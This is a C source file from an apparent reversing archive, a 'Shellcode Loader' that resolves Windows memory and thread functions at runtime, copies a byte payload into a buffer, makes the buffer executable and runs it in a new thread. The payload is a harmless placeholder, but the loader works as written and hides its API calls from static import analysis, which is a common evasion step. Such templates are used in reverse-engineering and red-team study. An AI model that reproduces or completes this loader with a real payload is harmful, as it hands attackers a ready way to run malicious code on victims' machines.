/*
    Shellcode Loader
    Archive of Reversing.ID

    Resolve function from DLL using LoadLibrary and GetProcAddress.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - access:       LoadLibrary + GetProcAddress
    - allocation:   VirtualAlloc
    - writing:      RtlMoveMemory
    - permission:   VirtualProtect
    - execution:    CreateThread
*/

#include <windows.h>
#include <stdint.h>

/* ========= function signatures ========= */
typedef LPVOID WINAPI VirtualAlloc_t(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   WINAPI VirtualProtect_t(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   WINAPI VirtualFree_t(LPVOID, SIZE_T, DWORD);
typedef HANDLE WINAPI CreateThread_t(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  WINAPI WaitForSingleObject_t(HANDLE, DWORD);

typedef VirtualAlloc_t        FAR * pVirtualAlloc;
typedef VirtualProtect_t      FAR * pVirtualProtect;
typedef VirtualFree_t         FAR * pVirtualFree;
typedef CreateThread_t        FAR * pCreateThread;
typedef WaitForSingleObject_t FAR * pWaitForSingleObject;


int main ()
{
    void *  runtime     = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // function pointers resolved at runtime
    pVirtualAlloc           fn_VirtualAlloc;
    pVirtualProtect         fn_VirtualProtect;
    pVirtualFree            fn_VirtualFree;
    pCreateThread           fn_CreateThread;
    pWaitForSingleObject    fn_WaitForSingleObject;

    HMODULE kernel32;

    // load DLL and resolve all functions at runtime
    kernel32               = LoadLibraryA ("kernel32.dll");
    fn_VirtualAlloc        = (pVirtualAlloc)        GetProcAddress (kernel32, "VirtualAlloc");
    fn_VirtualProtect      = (pVirtualProtect)      GetProcAddress (kernel32, "VirtualProtect");
    fn_VirtualFree         = (pVirtualFree)         GetProcAddress (kernel32, "VirtualFree");
    fn_CreateThread        = (pCreateThread)        GetProcAddress (kernel32, "CreateThread");
    fn_WaitForSingleObject = (pWaitForSingleObject) GetProcAddress (kernel32, "WaitForSingleObject");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = fn_VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval = fn_VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        h_thread = fn_CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        fn_WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    fn_VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}
